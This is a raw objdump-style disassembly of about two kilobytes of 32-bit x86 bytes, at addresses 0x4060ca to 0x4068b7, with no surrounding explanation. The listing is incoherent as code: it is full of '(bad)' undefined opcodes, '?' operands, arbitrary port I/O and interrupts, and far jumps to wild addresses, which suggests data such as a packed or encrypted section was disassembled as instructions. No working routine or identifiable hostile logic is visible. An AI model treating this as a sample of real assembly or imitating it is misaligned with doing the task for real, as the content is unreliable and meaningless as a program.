  4060ca:	fs adc ch,dl
  4060cd:	cdq    
  4060ce:	or     BYTE PTR [edi+esi*8+0x73],bl
  4060d2:	xchg   ebp,eax
  4060d3:	sbb    DWORD PTR [ecx+0x4d2ed743],ebx
  4060d9:	hlt    
  4060da:	mov    ebp,0x16c4099d
  4060df:	(bad)  
  4060e0:	jecxz  0x406080
  4060e2:	cdq    
  4060e3:	loope  0x406143
  4060e5:	push   edi
  4060e6:	ret    0x63ee
  4060e9:	neg    DWORD PTR [ebx+ebx*8-0x13]
  4060ed:	sbb    BYTE PTR [edx+0x69cf38bb],bl
  4060f3:	push   ebp
  4060f4:	mov    esp,0x76fb9034
  4060f9:	bound  esi,QWORD PTR [esi+0x9df0244]
  4060ff:	shl    DWORD PTR [edx+ecx*8],cl
  406102:	xor    DWORD PTR [edx+0x6f],eax
  406105:	mov    bl,0x8
  406107:	cld    
  406108:	sbb    al,0x76
  40610a:	pop    ebp
  40610b:	sub    dl,BYTE PTR ds:0x7dedd670
  406111:	and    DWORD PTR [ecx-0x5c1c5b0d],ebx
  406117:	xor    DWORD PTR [edx],0x6
  40611a:	dec    edx
  40611b:	imul   ebx,DWORD PTR [esi+0x5ade4078],0x5e
  406122:	mov    eax,ds:0x154ccd9
  406127:	aas    
  406128:	out    dx,al
  406129:	stos   DWORD PTR es:[edi],eax
  40612a:	lods   al,BYTE PTR fs:[esi]
  40612c:	imul   ebp,DWORD PTR [edi+0x43748c0e],0x6d2ab336
  406136:	scas   eax,DWORD PTR es:[edi]
  406137:	push   0xd8bbec6d
  40613c:	cmp    DWORD PTR [esi+0x42],eax
  40613f:	jle    0x40617e
  406141:	outs   dx,DWORD PTR ds:[esi]
  406142:	mov    ecx,0xfa4b593b
  406147:	or     eax,0x17fe37e3
  40614c:	shl    DWORD PTR [edx-0x1b],cl
  40614f:	repz cmc 
  406151:	loop   0x406101
  406153:	test   dh,bl
  406155:	push   0xffffffe2
  406157:	mov    ch,0xbd
  406159:	jno    0x4060e2
  40615b:	mov    ah,0x60
  40615d:	loopne 0x4061db
  40615f:	add    BYTE PTR [edi],bl
  406161:	jge    0x4061b0
  406163:	jmp    0x1770495f
  406168:	rcl    edi,0x3
  40616b:	aaa    
  40616c:	outs   dx,DWORD PTR ds:[esi]
  40616d:	stos   DWORD PTR es:[edi],eax
  40616e:	add    edx,DWORD PTR [ebx+0x1b083f80]
  406174:	push   edi
  406175:	xor    DWORD PTR [edi],eax
  406177:	pusha  
  406178:	int    0xbc
  40617a:	cdq    
  40617b:	fnstsw WORD PTR [ebp+0x48]
  40617e:	pop    edi
  40617f:	out    dx,al
  406180:	pop    ebx
  406181:	iret   
  406182:	push   cs
  406183:	pop    ebx
  406184:	jno    0x406116
  406186:	cmp    al,bh
  406188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406189:	xchg   BYTE PTR [esi-0x18],al
  40618c:	lock std 
  40618e:	punpcklbw mm4,DWORD PTR [edx]
  406191:	and    eax,0xf34d988a
  406196:	out    0xfb,eax
  406198:	push   0xec61d41a
  40619d:	push   ds
  40619e:	sub    esi,DWORD PTR [ebx]
  4061a0:	dec    ecx
  4061a1:	add    bh,BYTE PTR [edi]
  4061a3:	pop    esp
  4061a4:	mov    WORD PTR cs:[edx-0x18c93f50],es
  4061ab:	lea    edi,[edi]
  4061ad:	cmp    BYTE PTR [edi],dl
  4061af:	lods   eax,DWORD PTR ds:[esi]
  4061b0:	jmp    0x406201
  4061b2:	mov    al,0xe3
  4061b4:	and    bh,ch
  4061b6:	dec    edx
  4061b7:	jmp    0xa938:0x86e05a19
  4061be:	xchg   esp,eax
  4061bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061c1:	add    eax,0x5c016db
  4061c6:	(bad)  
  4061c7:	and    BYTE PTR [ebp+ecx*1+0x7654e3a],ah
  4061ce:	sbb    DWORD PTR [esi-0x23],eax
  4061d1:	aam    0xb4
  4061d3:	call   0x6b18ef74
  4061d8:	ret    0xfdf0
  4061db:	mov    edi,0x42e4b4aa
  4061e0:	imul   eax,DWORD PTR [ebx],0xe65454c8
  4061e6:	test   BYTE PTR [edx],ah
  4061e8:	out    dx,eax
  4061e9:	jmp    0x62b0e069
  4061ee:	or     esi,DWORD PTR ds:0xf515c42f
  4061f4:	mov    ?,WORD PTR [esp+ecx*8-0x33]
  4061f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061f9:	shl    BYTE PTR [edi-0x494671e6],1
  4061ff:	mov    al,0x66
  406201:	mov    esi,0x2d4da1e2
  406206:	loop   0x4061b5
  406208:	daa    
  406209:	(bad)  
  40620a:	stos   DWORD PTR es:[edi],eax
  40620b:	jb     0x40625f
  40620d:	jne    0x40623c
  40620f:	inc    edi
  406210:	fcom   QWORD PTR [ecx+0x6546bfbf]
  406216:	jns    0x4061e9
  406218:	xchg   esi,eax
  406219:	inc    edi
  40621a:	test   al,0xca
  40621c:	pop    esi
  40621d:	mov    ecx,0xe715fe67
  406222:	mov    al,0x3f
  406224:	das    
  406225:	mov    bh,0xb
  406227:	mov    ebp,DWORD PTR [ebp+0x4aaf2235]
  40622d:	stc    
  40622e:	retf   
  40622f:	es and bl,al
  406232:	pushf  
  406233:	repnz dec eax
  406235:	arpl   WORD PTR [ebx+0x48],cx
  406238:	mov    DWORD PTR [esi+eiz*4],edx
  40623b:	sbb    ebp,DWORD PTR [edi+ebx*2-0x7dbe2178]
  406242:	xlat   BYTE PTR ds:[ebx]
  406243:	out    dx,al
  406244:	shl    DWORD PTR [esi+0xb],1
  406247:	xchg   esp,eax
  406248:	popa   
  406249:	test   al,0xb6
  40624b:	lahf   
  40624c:	adc    cl,BYTE PTR [edi+ebx*2-0x46]
  406250:	inc    eax
  406251:	sbb    edx,DWORD PTR [edi]
  406253:	fisub  WORD PTR [ebp-0x23a69843]
  406259:	dec    esi
  40625a:	sbb    edi,DWORD PTR [edx]
  40625c:	mov    edi,0x39e2c71c
  406261:	adc    DWORD PTR [esi],ebp
  406263:	adc    DWORD PTR [ebp+0x62f141b3],eax
  406269:	ret    
  40626a:	add    DWORD PTR [edx+0x56ee0c76],0xffffffed
  406271:	fiadd  DWORD PTR [esi+esi*4-0x69329ce7]
  406278:	xchg   ecx,eax
  406279:	pop    edx
  40627a:	jo     0x40628f
  40627c:	fld1   
  40627e:	ins    DWORD PTR es:[edi],dx
  40627f:	retf   
  406280:	data16 out 0xa5,al
  406283:	or     BYTE PTR [esi],dh
  406285:	mov    ecx,0x26a3dcd5
  40628a:	fmul   st(4),st
  40628c:	and    eax,esp
  40628e:	sub    DWORD PTR [edi+0x155a24aa],esp
  406294:	addr16 lahf 
  406296:	cmc    
  406297:	arpl   WORD PTR [ecx-0x1fa09fd2],di
  40629d:	pop    esi
  40629e:	xlat   BYTE PTR ds:[ebx]
  40629f:	mov    al,ds:0x50cbf78f
  4062a4:	dec    esi
  4062a5:	das    
  4062a6:	cmc    
  4062a7:	ss jle 0x4062a9
  4062aa:	retf   
  4062ab:	pusha  
  4062ac:	push   ebp
  4062ad:	or     eax,0x27fe5800
  4062b2:	mov    ?,ecx
  4062b4:	and    eax,DWORD PTR fs:[edi]
  4062b7:	push   edi
  4062b8:	jg     0x4062aa
  4062ba:	sti    
  4062bb:	xchg   edx,eax
  4062bc:	scas   eax,DWORD PTR es:[edi]
  4062bd:	sbb    al,0xc5
  4062bf:	shl    BYTE PTR [ebx],cl
  4062c1:	rol    DWORD PTR [edx],1
  4062c3:	aad    0xe8
  4062c5:	mov    al,0x38
  4062c7:	call   FWORD PTR [esp+ecx*8]
  4062ca:	or     al,0x9e
  4062cc:	enter  0x67b9,0x7a
  4062d0:	inc    edi
  4062d1:	jne    0x4062e8
  4062d3:	xchg   edi,eax
  4062d4:	ds and ebx,esp
  4062d7:	aas    
  4062d8:	loopne 0x406294
  4062da:	inc    eax
  4062db:	cmp    esp,DWORD PTR [eax-0x78]
  4062de:	loope  0x406262
  4062e0:	jmp    0xf940:0x4444faec
  4062e7:	mov    ch,BYTE PTR [ebx]
  4062e9:	(bad)  
  4062eb:	cmp    BYTE PTR [edi],dl
  4062ed:	lods   al,BYTE PTR ds:[esi]
  4062ee:	xchg   ebx,eax
  4062ef:	fiadd  DWORD PTR [ebx-0x729cb03f]
  4062f5:	xor    ch,BYTE PTR [eax-0x47]
  4062f8:	cdq    
  4062f9:	shr    eax,cl
  4062fb:	inc    ebx
  4062fc:	cdq    
  4062fd:	mov    ds:0xe1a2bb80,eax
  406302:	jnp    0x40636b
  406304:	test   al,0x3b
  406306:	popa   
  406307:	and    BYTE PTR [ecx+0x3aed3449],cl
  40630d:	pop    es
  40630e:	lea    esi,[ecx+0x4c13fc31]
  406314:	retf   
  406315:	xor    DWORD PTR [ebx-0x7b],ecx
  406318:	ja     0x406377
  40631a:	sub    BYTE PTR [edi-0x32],dl
  40631d:	mov    al,ds:0xeac14d8d
  406322:	jnp    0x406384
  406324:	cmp    edx,edi
  406326:	sub    eax,0x2f643fc0
  40632b:	loope  0x40632a
  40632d:	fbld   TBYTE PTR [edi+0x3a]
  406330:	or     BYTE PTR [ebp-0x500f847f],0x26
  406337:	ss xchg ebp,eax
  406339:	sub    al,BYTE PTR [edi+0x17]
  40633c:	push   0x61882224
  406341:	mov    BYTE PTR [ebp-0x2b912605],bl
  406347:	adc    al,0xed
  406349:	push   0x767ab286
  40634e:	in     eax,0x3c
  406350:	sahf   
  406351:	adc    BYTE PTR [esi+ecx*1],al
  406354:	push   esi
  406355:	hlt    
  406356:	xor    DWORD PTR [ebp+0x325f9225],0xc1a30172
  406360:	add    eax,eax
  406362:	sbb    BYTE PTR [edx+0x3f],ch
  406365:	add    al,0xde
  406367:	mov    al,0x8f
  406369:	mov    edx,0xb4879a8f
  40636e:	adc    dl,dh
  406370:	int3   
  406371:	adc    dh,BYTE PTR [ebx+eax*1+0x4a]
  406375:	scas   eax,DWORD PTR es:[edi]
  406376:	xlat   BYTE PTR ds:[ebx]
  406377:	xchg   ebp,eax
  406378:	(bad)  
  406379:	mov    ebx,0xe29ede70
  40637e:	in     al,0xbb
  406380:	cmp    DWORD PTR [ebx-0x4ab8909a],0x86ab9dd3
  40638a:	aam    0xbb
  40638c:	bound  esp,QWORD PTR [esi+eiz*2]
  40638f:	add    ebx,ecx
  406391:	jmp    DWORD PTR [ebx]
  406393:	pusha  
  406394:	mov    ebp,0x689de2d7
  406399:	outs   dx,DWORD PTR ds:[esi]
  40639a:	xchg   ebp,eax
  40639b:	mov    ch,0x5
  40639d:	jg     0x4063f8
  40639f:	or     dl,BYTE PTR [ebp+0x3e]
  4063a2:	fadd   DWORD PTR [edx-0x168ec5fc]
  4063a8:	mov    ch,al
  4063aa:	in     eax,dx
  4063ab:	push   edx
  4063ac:	fimul  WORD PTR [edx+0x4c]
  4063af:	dec    edi
  4063b0:	std    
  4063b1:	popa   
  4063b2:	imul   edx,esp,0xf0a4501e
  4063b8:	inc    ecx
  4063b9:	aam    0x5d
  4063bb:	inc    edi
  4063bc:	adc    bl,BYTE PTR [edi+ebx*4]
  4063bf:	stc    
  4063c0:	call   0x45db:0x437961fc
  4063c7:	imul   esi,DWORD PTR [edx+esi*1],0xd2926aad
  4063ce:	es xchg ebp,eax
  4063d0:	sti    
  4063d1:	push   ebp
  4063d2:	push   ecx
  4063d3:	stos   DWORD PTR es:[edi],eax
  4063d4:	sbb    esp,esi
  4063d6:	test   al,0x96
  4063d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063d9:	mov    bh,0xe9
  4063db:	mov    DWORD PTR [ecx+0x4ef3a6ca],eax
  4063e1:	adc    bh,ch
  4063e3:	mov    eax,ds:0xd6e1c6e8
  4063e8:	(bad)  
  4063e9:	in     eax,0x4a
  4063eb:	shl    BYTE PTR [ecx],1
  4063ed:	hlt    
  4063ee:	pop    esp
  4063ef:	xchg   ebp,eax
  4063f0:	xor    BYTE PTR [ecx+0xb],0xc8
  4063f4:	icebp  
  4063f5:	mov    edx,0x9c2273b7
  4063fa:	or     DWORD PTR ds:0xd585ed63,0x3b1540ae
  406404:	fistp  QWORD PTR [edi]
  406406:	or     BYTE PTR [edx-0x5521ad99],bh
  40640c:	cli    
  40640d:	and    DWORD PTR [esi+0x2c689b97],0x2b
  406414:	cmp    al,0x53
  406416:	and    al,0x8f
  406418:	mov    ebp,0x21be26a0
  40641d:	pusha  
  40641e:	cld    
  40641f:	lds    ebx,FWORD PTR [ebp+0x6e]
  406422:	ds jmp 0x406401
  406425:	pushf  
  406426:	clc    
  406427:	sbb    eax,0xa1b1f194
  40642c:	cmc    
  40642d:	int    0x48
  40642f:	test   bh,ah
  406431:	mov    cl,0x15
  406433:	mov    ds:0x89d1a89,al
  406438:	mov    al,0xb5
  40643a:	sub    DWORD PTR [ebx+0x192367c3],0x54
  406441:	inc    ecx
  406442:	push   edi
  406443:	sub    al,0xda
  406445:	pusha  
  406446:	daa    
  406447:	sbb    ebp,edi
  406449:	in     ax,0x81
  40644c:	call   0x1ffc8ea5
  406451:	or     bl,BYTE PTR [edi+0x26]
  406454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406455:	jecxz  0x40648f
  406457:	jge    0x406413
  406459:	mov    al,0x5a
  40645b:	xchg   ecx,eax
  40645c:	(bad)  
  40645d:	ret    
  40645e:	push   eax
  40645f:	cwde   
  406460:	push   esi
  406461:	jnp    0x4064c0
  406463:	mov    edi,0x3bab948f
  406468:	mov    ds:0x423c9095,eax
  40646d:	xchg   edx,eax
  40646e:	nop
  40646f:	pop    esp
  406470:	jne    0x4064d9
  406472:	repnz mov ds:0xbf8aec54,al
  406478:	lea    ecx,[esi+0x70]
  40647b:	pop    esi
  40647c:	jo     0x4064e0
  40647e:	lock cmc 
  406480:	push   ebx
  406481:	je     0x4064a3
  406483:	sub    eax,0xb741b483
  406488:	inc    ebx
  406489:	mul    BYTE PTR [edx]
  40648b:	loope  0x4064ed
  40648d:	outs   dx,DWORD PTR ds:[esi]
  40648e:	pushf  
  40648f:	nop
  406490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406491:	ds or  al,0x83
  406494:	sub    eax,esp
  406496:	dec    ebp
  406497:	retf   0xbbf0
  40649a:	test   eax,0x44868b9d
  40649f:	push   eax
  4064a0:	outs   dx,DWORD PTR ds:[esi]
  4064a1:	enter  0x1205,0x73
  4064a5:	je     0x40648d
  4064a7:	sbb    DWORD PTR [eax+0x14],ecx
  4064aa:	(bad)  
  4064ab:	mov    bl,0x35
  4064ad:	(bad)
  4064b1:	bound  edx,QWORD PTR [edi-0x6455b70b]
  4064b7:	mov    ebx,0x5e0db8fe
  4064bc:	scas   eax,DWORD PTR es:[edi]
  4064bd:	xchg   DWORD PTR [edi],ebx
  4064bf:	ret    0xa717
  4064c2:	mov    esp,0x807c6135
  4064c7:	inc    edi
  4064c8:	ins    BYTE PTR es:[edi],dx
  4064c9:	aas    
  4064ca:	es popa 
  4064cc:	and    edx,ebx
  4064ce:	jno    0x4064fe
  4064d0:	ja     0x406515
  4064d2:	adc    eax,0x451713db
  4064d7:	jno    0x40649d
  4064d9:	cli    
  4064da:	addr16 push 0xfb1ad054
  4064e0:	outs   dx,BYTE PTR ds:[esi]
  4064e1:	push   ebx
  4064e2:	outs   dx,BYTE PTR ds:[esi]
  4064e3:	and    al,0x50
  4064e5:	outs   dx,BYTE PTR ds:[esi]
  4064e6:	or     DWORD PTR [esi*1-0x5c75d032],ebp
  4064ed:	sti    
  4064ee:	mov    ecx,0x982417a3
  4064f3:	or     BYTE PTR [edi-0x6742859c],bl
  4064f9:	pop    ecx
  4064fa:	out    0xd5,al
  4064fc:	dec    ecx
  4064fd:	lods   eax,DWORD PTR ds:[esi]
  4064fe:	push   ecx
  4064ff:	test   DWORD PTR [eax-0x707a7b86],ecx
  406505:	inc    edx
  406506:	mov    eax,ds:0xcaec56b0
  40650b:	pop    esp
  40650c:	pop    es
  40650d:	sbb    eax,esi
  40650f:	dec    edi
  406510:	in     al,0xb2
  406512:	push   edx
  406513:	leave  
  406514:	mov    ebp,0x63edc738
  406519:	rcr    DWORD PTR [edx],cl
  40651b:	jp     0x4064db
  40651d:	push   0xffffffa1
  40651f:	bound  ecx,QWORD PTR [edi-0x36]
  406522:	inc    eax
  406523:	jle    0x406564
  406525:	in     al,dx
  406526:	aaa    
  406527:	add    DWORD PTR [eax],esi
  406529:	mov    eax,0x11aeba73
  40652e:	(bad)  
  40652f:	retf   
  406530:	and    BYTE PTR [esi+ecx*4-0x2dad7926],bl
  406537:	lods   eax,DWORD PTR ds:[esi]
  406538:	(bad)  
  406539:	sbb    cl,BYTE PTR [eax+eiz*4+0x76224eeb]
  406540:	sub    bl,BYTE PTR [ebp+0x10]
  406543:	call   0xc35582ec
  406548:	int    0x6c
  40654a:	pop    es
  40654b:	loope  0x40657a
  40654d:	xlat   BYTE PTR ds:[ebx]
  40654e:	retf   
  40654f:	lock (bad) 
  406552:	pusha  
  406553:	hlt    
  406554:	and    eax,0x80cc841d
  406559:	push   ss
  40655a:	sbb    eax,0x9fc2420f
  40655f:	popf   
  406560:	lock jb 0x4065d5
  406563:	jle    0x40657f
  406565:	and    edi,DWORD PTR [esp+esi*2+0x2ae7b60f]
  40656c:	rcl    BYTE PTR [esi-0x35],0x8b
  406570:	inc    ecx
  406571:	xor    BYTE PTR [ebx-0x66],bh
  406574:	daa    
  406575:	and    bh,bh
  406577:	jno    0x4065a1
  406579:	push   ds
  40657a:	inc    ebp
  40657b:	ror    DWORD PTR [ebx+0x42aee6f5],cl
  406581:	scas   al,BYTE PTR es:[edi]
  406582:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406583:	mov    DWORD PTR [edx-0x69],0x5fdbb85e
  40658a:	jb     0x406559
  40658c:	jb     0x4065a1
  40658e:	repz sbb eax,0x38e8cd0b
  406594:	sub    dh,BYTE PTR [edx]
  406596:	out    0x57,eax
  406598:	(bad)  [ecx]
  40659a:	nop
  40659b:	(bad)  
  40659d:	cmp    al,0x26
  40659f:	fnsave [ebx+ebx*4-0x5466f522]
  4065a6:	sbb    eax,0x2ef7425c
  4065ab:	jmp    0x4278abd1
  4065b0:	test   DWORD PTR [ebp-0x7a44b5ab],edx
  4065b6:	aam    0xc7
  4065b8:	pop    esp
  4065b9:	dec    eax
  4065ba:	retf   0x64ae
  4065bd:	pop    edi
  4065be:	pop    edx
  4065bf:	mov    al,0x81
  4065c1:	mov    dh,ah
  4065c3:	je     0x406574
  4065c5:	adc    eax,0x4baac726
  4065ca:	or     BYTE PTR [ecx],0xb
  4065cd:	cmc    
  4065ce:	rcr    BYTE PTR [eax+0x1c],1
  4065d1:	icebp  
  4065d2:	lds    eax,FWORD PTR [ebx-0x50]
  4065d5:	or     eax,0x279ad614
  4065da:	adc    DWORD PTR [ebp+0x40],edx
  4065dd:	pop    ds
  4065de:	loop   0x4065e5
  4065e0:	mov    esi,0x7069972c
  4065e5:	icebp  
  4065e6:	mov    dl,0xb5
  4065e8:	cmc    
  4065e9:	dec    edx
  4065ea:	or     DWORD PTR [edx+0x2257532a],edx
  4065f0:	mov    ds:0x913c72b,al
  4065f5:	gs inc eax
  4065f7:	shl    BYTE PTR [ebp+0x372d2934],cl
  4065fd:	icebp  
  4065fe:	xor    DWORD PTR ds:0xfb5d410a,eax
  406604:	push   edi
  406605:	jo     0x4065bc
  406607:	mov    dh,0x33
  406609:	mov    ebx,0xccb565d7
  40660e:	mov    ?,WORD PTR [ebx+0xde4f6c1]
  406614:	mov    cl,0x6
  406616:	imul   DWORD PTR [edi-0x4f]
  406619:	(bad)  
  40661a:	mov    esp,0x9463775e
  40661f:	lods   eax,DWORD PTR ds:[esi]
  406620:	inc    edx
  406621:	sbb    al,0xc8
  406623:	mov    ecx,gs
  406625:	imul   esi,DWORD PTR [eax],0x3bd3b5da
  40662b:	pop    ecx
  40662c:	aad    0x57
  40662e:	cmp    esp,DWORD PTR [esi]
  406630:	in     eax,0x18
  406632:	test   DWORD PTR [ebp+0x1a53bf0e],ebp
  406638:	pop    DWORD PTR [edx+0x69fa515f]
  40663e:	xchg   edi,eax
  40663f:	stc    
  406640:	aad    0x3f
  406642:	jge    0x406643
  406644:	arpl   cx,si
  406646:	sub    BYTE PTR [edx+0x2eeb3aec],0x53
  40664d:	popf   
  40664e:	add    BYTE PTR [ebp+0x4eb0a46a],cl
  406654:	sbb    al,0xbd
  406656:	add    BYTE PTR [ebx-0x4068297b],al
  40665c:	jae    0x406603
  40665e:	rcl    DWORD PTR [ebx+0x45],0x83
  406662:	icebp  
  406663:	adc    bh,dh
  406665:	or     edi,DWORD PTR [edx+0x31]
  406668:	mov    ecx,?
  40666a:	mov    cl,0xf9
  40666c:	jmp    0x93d259ef
  406671:	shl    DWORD PTR [ebp-0x33965f0a],cl
  406677:	push   esp
  406678:	jge    0x406638
  40667a:	mov    ebx,0xa11fc9b5
  40667f:	aaa    
  406680:	(bad)  
  406681:	ja     0x406645
  406683:	sahf   
  406684:	rol    DWORD PTR [ebx],cl
  406686:	mov    ebp,0xf1fe5fd
  40668b:	int3   
  40668c:	pop    ecx
  40668d:	aam    0x58
  40668f:	xchg   ecx,eax
  406690:	aad    0x9d
  406692:	push   ss
  406693:	bound  ecx,QWORD PTR [ecx+0x60126349]
  406699:	cs mov bh,0x5f
  40669c:	jbe    0x406718
  40669e:	inc    esi
  40669f:	rol    esi,1
  4066a1:	data16 and BYTE PTR gs:[ebx+edi*4],0xe6
  4066a7:	jp     0x4066cd
  4066a9:	iret   
  4066aa:	ja     0x4066ad
  4066ac:	addr16 mov bh,0xb0
  4066af:	and    BYTE PTR [edi+0x5c],ch
  4066b2:	jge    0x406705
  4066b4:	xchg   edi,eax
  4066b5:	inc    ebx
  4066b6:	mov    ebp,0x65510c9d
  4066bb:	jmp    0xe53b:0x5acdcf73
  4066c2:	mov    dh,0xe3
  4066c4:	inc    edx
  4066c5:	ret    0xb990
  4066c8:	mov    dh,0x6f
  4066ca:	jae    0x40665c
  4066cc:	jbe    0x4066f4
  4066ce:	push   ds
  4066cf:	or     bl,bh
  4066d1:	(bad)  
  4066d2:	popf   
  4066d3:	icebp  
  4066d4:	jnp    0x40674f
  4066d6:	loope  0x4066bd
  4066d8:	adc    eax,0x5436e864
  4066dd:	mov    al,0x45
  4066df:	sbb    eax,0xb1b28f23
  4066e4:	inc    BYTE PTR [ecx]
  4066e6:	adc    DWORD PTR [eax+esi*8+0x22baa724],esi
  4066ed:	inc    ecx
  4066ee:	mov    al,BYTE PTR [eax+esi*8]
  4066f1:	push   ss
  4066f2:	es mov edi,0xa7adf64f
  4066f8:	sub    al,0xda
  4066fa:	hlt    
  4066fb:	arpl   WORD PTR [esi+eiz*8-0x4da85fe8],si
  406702:	sub    eax,0x1c8e13dc
  406707:	add    ebp,DWORD PTR [ecx-0x13]
  40670a:	xor    dl,BYTE PTR [ebp+0x651c4bfe]
  406710:	dec    esp
  406711:	and    al,0x91
  406713:	shr    BYTE PTR [esi+0x15393cd3],1
  406719:	xchg   ebx,eax
  40671a:	jle    0x4066b6
  40671c:	retf   0xf7c3
  40671f:	(bad)  
  406720:	shl    DWORD PTR [edx+0x3b],cl
  406723:	cli    
  406724:	fwait
  406725:	(bad)  
  406726:	jge    0x4066fa
  406728:	inc    ebp
  406729:	dec    ebx
  40672a:	or     eax,0x7ed4ea0e
  40672f:	pop    ds
  406730:	inc    eax
  406731:	adc    DWORD PTR [ebx+edx*4-0x5f],ebx
  406735:	sub    al,0xe8
  406737:	int3   
  406738:	fdiv   DWORD PTR [eax*1-0x20253673]
  40673f:	cmc    
  406740:	int    0xa1
  406742:	fidiv  WORD PTR [edx]
  406744:	mov    eax,ds:0xf2868889
  406749:	ret    
  40674a:	pop    eax
  40674b:	std    
  40674c:	and    eax,0xccdc31aa
  406751:	dec    ebp
  406752:	fwait
  406753:	aam    0xba
  406755:	je     0x4067a2
  406757:	sar    DWORD PTR fs:[ebp-0x70],0x2a
  40675c:	(bad)  
  40675d:	xchg   esi,eax
  40675e:	cmp    bh,cl
  406760:	adc    ch,BYTE PTR [ebp+0x62]
  406763:	inc    edx
  406764:	mov    ds:0xd85bf1f8,eax
  406769:	sbb    BYTE PTR [esi],0x7b
  40676c:	mov    eax,ds:0x89395b4a
  406771:	adc    dl,BYTE PTR [ebx+0x26]
  406774:	xchg   ebp,eax
  406775:	jg     0x406716
  406777:	or     esi,DWORD PTR [edi+0x6b]
  40677a:	inc    edi
  40677b:	xchg   edx,eax
  40677c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40677d:	pop    esi
  40677e:	(bad)  
  40677f:	addr16 xchg esp,eax
  406781:	cmc    
  406782:	mov    BYTE PTR [ecx-0x80],cl
  406785:	add    DWORD PTR [eax+eax*8],0xfbbec6f9
  40678c:	arpl   WORD PTR [esi],bx
  40678e:	sbb    BYTE PTR [ebx+0x39c0538f],ah
  406794:	and    BYTE PTR [ecx+0x148a2f58],ah
  40679a:	jge    0x406750
  40679c:	stos   DWORD PTR es:[edi],eax
  40679d:	pop    ss
  40679e:	sub    ch,BYTE PTR [eax-0x68]
  4067a1:	cs aam 0x16
  4067a4:	ret    0xc249
  4067a7:	daa    
  4067a8:	inc    ebx
  4067a9:	cwde   
  4067aa:	dec    ebp
  4067ab:	push   ss
  4067ac:	ret    0x87dc
  4067af:	in     al,dx
  4067b0:	or     dh,BYTE PTR [edi-0x34]
  4067b3:	call   0x55d9:0xc0f4b467
  4067ba:	fidiv  DWORD PTR [ebx+ecx*2+0x5d]
  4067be:	push   ds
  4067bf:	mov    ebx,0xdfcdf46b
  4067c4:	xchg   edi,eax
  4067c5:	pop    esp
  4067c6:	dec    esp
  4067c7:	jnp    0x40678e
  4067c9:	sub    al,0x51
  4067cb:	es (bad) 
  4067ce:	out    dx,eax
  4067cf:	js     0x4067f7
  4067d1:	shl    eax,0x7
  4067d4:	or     DWORD PTR [ecx+0x79],ecx
  4067d7:	les    esi,FWORD PTR [eax+0x51]
  4067da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067db:	hlt    
  4067dc:	rcr    BYTE PTR [ebx+0x41],0x22
  4067e0:	xchg   ecx,eax
  4067e1:	cmp    DWORD PTR [edi],esp
  4067e3:	push   edi
  4067e4:	cmp    BYTE PTR [esi+ebp*8-0x43715ecb],dh
  4067eb:	stos   DWORD PTR es:[edi],eax
  4067ec:	jne    0x40677c
  4067ee:	xchg   DWORD PTR [ecx+eiz*2],esi
  4067f1:	inc    edi
  4067f2:	sbb    edx,DWORD PTR ds:0x2cf5f557
  4067f8:	sbb    ah,dl
  4067fa:	fcomp  QWORD PTR [ebp+ebp*1-0x3]
  4067fe:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406800:	test   BYTE PTR [ebx-0x48],cl
  406803:	call   0x4cc2977
  406808:	or     BYTE PTR [ebp-0x37],ah
  40680b:	ins    BYTE PTR es:[edi],dx
  40680c:	jo     0x406821
  40680e:	(bad)  
  40680f:	cld    
  406810:	adc    eax,0xbfe234b5
  406815:	jmp    0xade8:0xe8a7252f
  40681c:	dec    esi
  40681d:	ret    
  40681e:	add    ch,BYTE PTR [ebx-0x56644b5d]
  406824:	mov    WORD PTR [edi+edi*1+0x34ad2d5d],ds
  40682b:	pop    esi
  40682c:	dec    edx
  40682d:	sbb    al,0xfb
  40682f:	fnsave [eax]
  406831:	fisttp QWORD PTR [esi+0x36]
  406834:	xor    DWORD PTR ds:0x242a69af,eax
  40683a:	sar    DWORD PTR [esp+ecx*1-0x5c4b9430],1
  406841:	push   eax
  406842:	loop   0x40684d
  406844:	lods   al,BYTE PTR ds:[esi]
  406845:	xor    ebx,DWORD PTR [ebp-0x150b3b42]
  40684b:	pusha  
  40684c:	mov    BYTE PTR [edi],cl
  40684e:	icebp  
  40684f:	pop    esi
  406850:	jne    0x406877
  406852:	(bad)
  406857:	cmp    ecx,DWORD PTR [ecx-0x2a462fb7]
  40685d:	mov    edi,0x207559f5
  406862:	push   edi
  406863:	retf   
  406864:	outs   dx,BYTE PTR ds:[esi]
  406865:	lods   eax,DWORD PTR ds:[esi]
  406866:	pop    es
  406867:	push   eax
  406868:	cdq    
  406869:	sub    ah,BYTE PTR [eax+eax*8+0x4c]
  40686d:	les    edx,FWORD PTR [edi]
  40686f:	jno    0x406884
  406871:	pop    edi
  406872:	fimul  DWORD PTR [eax+0x73]
  406875:	push   esp
  406876:	into   
  406877:	inc    ecx
  406878:	ror    BYTE PTR [edx],1
  40687a:	enter  0x5a63,0x18
  40687e:	mov    eax,0xac72c769
  406883:	out    dx,eax
  406884:	scas   al,BYTE PTR es:[edi]
  406885:	rcr    BYTE PTR [edx+0x48],1
  406888:	rol    DWORD PTR [ebp+ecx*4-0x2b197ed7],1
  40688f:	sar    DWORD PTR [ebx-0x6bb3299a],cl
  406895:	or     ah,BYTE PTR [esi+ebp*2-0x119116fc]
  40689c:	xchg   edx,eax
  40689d:	and    bl,BYTE PTR [eax]
  40689f:	jle    0x4068fe
  4068a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068a2:	cmp    BYTE PTR [edi-0x13],al
  4068a5:	push   ds
  4068a6:	xchg   esi,eax
  4068a7:	aaa    
  4068a8:	mov    dl,0x6c
  4068aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068ab:	inc    esi
  4068ac:	push   0x2a
  4068ae:	pop    ebp
  4068af:	mov    ch,0x98
  4068b1:	push   es
  4068b2:	aaa    
  4068b3:	fbld   TBYTE PTR [edi+0x3e]
  4068b6:	pop    edi
  4068b7:	mov    dh,0xd
